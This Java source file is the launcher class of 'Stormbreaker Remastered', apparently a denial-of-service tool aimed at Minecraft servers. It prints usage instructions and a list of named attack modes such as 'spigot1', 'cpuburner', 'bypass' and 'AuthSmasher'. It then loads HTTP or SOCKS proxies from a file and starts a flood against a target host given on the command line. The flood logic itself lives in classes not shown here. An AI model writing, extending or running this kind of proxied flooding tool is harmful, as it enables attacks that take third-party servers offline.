package me.michaeldevc;

import me.michaeldevc.flood.FloodRunner;
import me.michaeldevc.helper.ConsoleCoders;
import me.michaeldevc.option.Options;
import me.michaeldevc.proxy.Proxies;

import java.net.Proxy;

public class Stormbreaker {
    private final Options options;

    public Stormbreaker(Options options) {
        this.options = options;
    }

    public void launch() {
        System.out.println("   _____ __                       __                    __                  ____                            __                     __     __\n" +
                "  / ___// /_____  _________ ___  / /_  ________  ____ _/ /_____  _____     / __ \\___  ____ ___  ____ ______/ /____  ________  ____/ /    / /\n" +
                "  \\__ \\/ __/ __ \\/ ___/ __ `__ \\/ __ \\/ ___/ _ \\/ __ `/ //_/ _ \\/ ___/    / /_/ / _ \\/ __ `__ \\/ __ `/ ___/ __/ _ \\/ ___/ _ \\/ __  /    / / \n" +
                " ___/ / /_/ /_/ / /  / / / / / / /_/ / /  /  __/ /_/ / ,< /  __/ /       / _, _/  __/ / / / / / /_/ (__  ) /_/  __/ /  /  __/ /_/ /    /_/  \n" +
                "/____/\\__/\\____/_/  /_/ /_/ /_/_.___/_/   \\___/\\__,_/_/|_|\\___/_/       /_/ |_|\\___/_/ /_/ /_/\\__,_/____/\\__/\\___/_/   \\___/\\__,_/    (_)   \n" +
                "                                                                                                                                            "
        );

        System.out.format("\n%sCommand example: java -jar Stormbreaker_Remastered.jar host=127.0.0.1 exploit=spigot1%s", ConsoleCoders.ANSI_CYAN, ConsoleCoders.ANSI_RESET);
        System.out.format("\n%sArguments available [ host - port - proxiesType - proxiesFile - srvResolve - alwaysResolve - threads - connections - attackTime - srvResolve2 - keepAlive - exploit - removeFailure - loopAmount ]%s", ConsoleCoders.ANSI_GREEN, ConsoleCoders.ANSI_RESET);
        System.out.format("\n%sExploit available [ localhost - bosshandler - cpulagger - test1 - test2 - flood1 - flood2 - spigot1 - spigot2 - bypass1 - bypass2 - bypass3 - extreme1 - extreme2 - extreme3 - extreme4 - extreme5 - cpuburner1 - cpuburber2 - cpuburner3 - cpuburner4 - cpuburner5 - cpuburner6 - Destroyer - ZeusSlapper - BypassHub1 - exceptionBypass - AuthSmasher ]%s\n\n", ConsoleCoders.ANSI_RED, ConsoleCoders.ANSI_RESET);

        if (!this.options.isOption("host")) {
            System.out.println("No \"host\" option provided!\n\n");
        } else {
            String proxiesType = (String)this.options.getOption("proxiesType", "http");
            String proxiesFile = (String)this.options.getOption("proxiesFile", "proxies.txt");
            Proxies proxies = new Proxies();

            try {
                if (proxiesType.equalsIgnoreCase("socks")) {
                    proxies.init(proxiesFile, Proxy.Type.SOCKS);
                } else {
                    proxies.init(proxiesFile, Proxy.Type.HTTP);
                }
            } catch (Exception var5) {
                System.out.println("Couldn't init proxies instance!");
                return;
            }

            System.out.println();
            System.out.format("%sProxies: %d%s\n", ConsoleCoders.ANSI_BLUE , proxies.size(), ConsoleCoders.ANSI_RESET);
            System.out.format("%sAttack: %s%s\n", ConsoleCoders.ANSI_RED, (String)this.options.getOption("exploit", "1"), ConsoleCoders.ANSI_RESET);
            (new FloodRunner(this.options, proxies)).run();
        }
    }
}
